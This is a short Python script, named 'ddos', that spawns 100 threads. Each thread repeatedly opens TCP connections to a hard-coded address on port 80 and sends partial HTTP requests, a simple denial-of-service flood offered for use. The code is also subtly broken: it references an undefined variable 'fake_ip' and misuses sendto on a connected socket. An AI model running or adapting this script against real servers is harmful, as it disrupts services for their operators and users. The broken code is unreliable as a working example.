import socket
import threading
target = "192.168.43.37"
port = 80
def ddos():
    t = 0
    while t <= 10000:
        print(t)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        t += 1


for i in range(100):
    thread = threading.Thread(target=ddos)
    print(i)
    thread.start()